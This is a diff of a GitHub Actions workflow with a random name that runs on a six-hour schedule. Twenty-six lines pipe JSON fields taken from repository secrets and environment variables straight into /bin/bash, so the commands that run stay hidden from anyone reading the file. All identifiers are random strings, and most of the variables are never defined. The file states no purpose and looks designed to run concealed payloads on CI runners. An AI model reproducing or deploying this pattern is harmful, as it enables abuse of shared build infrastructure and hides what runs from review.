@@ -1,26 +1,42 @@
 name: trolleybusbask
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 5/6 * * *'
+    - cron: '19 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: trolleybusbask
         env:
-          vnh88: ${{ secrets.vnh88 }}
+          pn31: ${{ secrets.pn31 }}
         run: |
-          echo $vnh88 | jq -r .xt4 | /bin/bash
-          echo $mpvgt2 | jq -r .zoae6640 | /bin/bash
-          echo $ipwlt7677 | jq -r .wq9 | /bin/bash
-          echo $mlrsk723 | jq -r .euhyf83260 | /bin/bash
-          echo $vjfvc4482 | jq -r .ngmp378 | /bin/bash
-          echo $p4 | jq -r .vq05 | /bin/bash
-          echo $n2780 | jq -r .nwd305 | /bin/bash
-          echo $ve5681 | jq -r .nj94 | /bin/bash
-          echo $avia5 | jq -r .upjt166 | /bin/bash
-          echo $krue1695 | jq -r .xurxu185 | /bin/bash
+          echo $pn31 | jq -r .wj07989 | /bin/bash
+          echo $rjsk29724 | jq -r .ffbao2393 | /bin/bash
+          echo $yexgv04382 | jq -r .gi310 | /bin/bash
+          echo $yl53163 | jq -r .aw47 | /bin/bash
+          echo $grw3 | jq -r .ebl86 | /bin/bash
+          echo $ic5 | jq -r .vrc3243 | /bin/bash
+          echo $mpn8 | jq -r .ixd75 | /bin/bash
+          echo $art13 | jq -r .hjsp23 | /bin/bash
+          echo $lumd5 | jq -r .mgohy56884 | /bin/bash
+          echo $uesqp68556 | jq -r .a72 | /bin/bash
+          echo $vjsf959 | jq -r .b000 | /bin/bash
+          echo $pn609 | jq -r .wxjyc01745 | /bin/bash
+          echo $rgw0517 | jq -r .yxbv293 | /bin/bash
+          echo $hicgw654 | jq -r .yzmoc528 | /bin/bash
+          echo $excyr987 | jq -r .vevuq1 | /bin/bash
+          echo $zf8 | jq -r .qxc7266 | /bin/bash
+          echo $vgp90 | jq -r .b756 | /bin/bash
+          echo $roun66 | jq -r .oyhd59 | /bin/bash
+          echo $h14143 | jq -r .otf3369 | /bin/bash
+          echo $zglgv821 | jq -r .n760 | /bin/bash
+          echo $nzd99814 | jq -r .va860 | /bin/bash
+          echo $gk5 | jq -r .bjklq92706 | /bin/bash
+          echo $dc75 | jq -r .eont50 | /bin/bash
+          echo $lzusi17 | jq -r .oz04 | /bin/bash
+          echo $x048 | jq -r .ge6324 | /bin/bash
+          echo $hexdp6 | jq -r .b50690 | /bin/bash
 
